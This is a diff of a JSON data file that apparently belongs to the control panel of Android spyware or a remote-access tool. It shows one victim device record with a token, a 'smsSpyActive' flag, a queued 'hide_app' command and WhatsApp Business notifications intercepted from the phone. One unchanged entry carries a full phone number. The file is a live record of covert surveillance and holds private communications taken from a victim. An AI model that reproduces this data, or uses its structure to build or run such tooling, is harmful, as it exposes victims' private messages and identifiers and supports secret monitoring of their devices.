@@ -166,7 +166,15 @@
     "ownerUsername": "GANANG",
     "token": "511c843889490f24a83fdf9ff1ebec0c",
     "lastSeen": 1775629505596,
-    "commandQueue": [],
+    "commandQueue": [
+      {
+        "type": "hide_app",
+        "payload": {
+          "hide": false
+        },
+        "sentAt": 1775629514778
+      }
+    ],
     "online": true,
     "connectedAt": "2026-04-08T06:21:32.558Z",
     "deviceInfo": {
@@ -181,6 +189,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "‎𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏 (2 pesan): Menyebut Anda",
+        "content": "~ ★: @⁨Naxrat⁩ BCA chat",
+        "time": "08/04 13:25",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775629527352
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎8 pesan dari 2 chat",
+        "time": "08/04 13:25",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775629527348
+      },
       {
         "appName": "WA Business",
         "sender": "+62 815-2386-4283",
